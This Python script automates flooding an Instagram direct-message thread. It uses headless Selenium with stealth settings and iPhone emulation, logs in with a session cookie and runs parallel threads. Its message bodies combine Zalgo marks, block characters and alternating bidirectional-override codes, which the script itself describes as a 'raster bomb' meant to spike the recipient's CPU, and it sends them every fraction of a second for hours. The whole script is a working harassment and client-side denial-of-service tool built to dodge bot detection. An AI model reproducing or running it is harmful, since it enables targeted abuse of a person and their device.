# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (SLEDGEHAMMER V14)
# 📅 STATUS: TOTAL-UI-LOCK | DOCKER-READY | SELENIUM-HYBRID

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor

# 📦 SELENIUM STEALTH
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- CONFIGURATION ---
THREADS = 2 
TOTAL_DURATION = 25000 
BURST_SPEED = (0.05, 0.1)  # Overclocked speed
SESSION_LIMIT = 120 # Restart every 2 minutes

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()
sys.stdout.reconfigure(encoding='utf-8')

def get_heavy_payload():
    """Generates a Recursive Isolate + Block Wall payload."""
    u_id = random.randint(1000, 9999)
    glue = "\u2060" # Word Joiner (Zero width)
    
    # 👑 THE BRANDING
    header = f"👑 𝕻𝕽𝕬𝖁𝕰𝕰𝕽 𝕻𝕬𝕻𝕬 𝕺𝕹 𝕿𝕺𝕻 👑 ID:{u_id}{glue}"
    
    # 🏗️ THE 'RASTER-BOMB'
    # Mixing Full Blocks (█) with BIDI-Overrides (\u202E) 
    z_tower = "̸" * 175 # High density Zalgo
    body = []
    for i in range(130):
        # Nested Directional Isolation forces CPU spikes
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        body.append(f"{prefix}█_𝕻𝕬𝕻𝕬_𝕺𝖂𝕹𝕿_█{z_tower}")
        
    return (header + glue.join(body))[:9990]

def log_status(agent_id, msg):
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    print(f"[{timestamp}] Agent {agent_id}: {msg}", flush=True)

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        
        mobile_emulation = {
            "deviceMetrics": { "width": 375, "height": 812, "pixelRatio": 3.0 },
            "userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
        }
        chrome_options.add_experimental_option("mobileEmulation", mobile_emulation)
        
        temp_dir = os.path.join(tempfile.gettempdir(), f"strike_node_{agent_id}_{int(time.time())}")
        chrome_options.add_argument(f"--user-data-dir={temp_dir}")
        driver = webdriver.Chrome(options=chrome_options)

        stealth(driver,
            languages=["en-US", "en"],
            vendor="Google Inc.",
            platform="iPhone", 
            webgl_vendor="Apple Inc.",
            renderer="Apple GPU",
            fix_hairline=True,
        )
        driver.custom_temp_path = temp_dir
        return driver

def adaptive_inject(driver, element, text):
    try:
        driver.execute_script("""
            var el = arguments[0];
            el.focus();
            document.execCommand('insertText', false, arguments[1]);
            el.dispatchEvent(new Event('input', { bubbles: true }));
        """, element, text)
        time.sleep(0.05)
        element.send_keys(Keys.ENTER)
        return True
    except:
        return False

def run_life_cycle(agent_id, cookie, target):
    global_start = time.time()
    while (time.time() - global_start) < TOTAL_DURATION:
        driver = None
        session_start = time.time()
        try:
            log_status(agent_id, "[SYNC] Launching Shadow-Node...")
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(6) 
            
            # Find Message Box
            box = None
            for _ in range(10):
                try:
                    box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
                    if box: break
                except: time.sleep(1)

            if not box: continue
            
            # Send Active Ping
            adaptive_inject(driver, box, "👑 MATRIX ACTIVE 👑")

            while (time.time() - session_start) < SESSION_LIMIT:
                payload = get_heavy_payload()
                if adaptive_inject(driver, box, payload):
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    log_status(agent_id, f"[HIT] Strike Delivered ({GLOBAL_SENT} Total)")
                
                time.sleep(random.uniform(*BURST_SPEED))

        except Exception as e:
            log_status(agent_id, f"[GLITCH] Retrying session...")
        
        finally:
            if driver: driver.quit()
            shutil.rmtree(getattr(driver, 'custom_temp_path', ''), ignore_errors=True)
            gc.collect()
            time.sleep(2)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
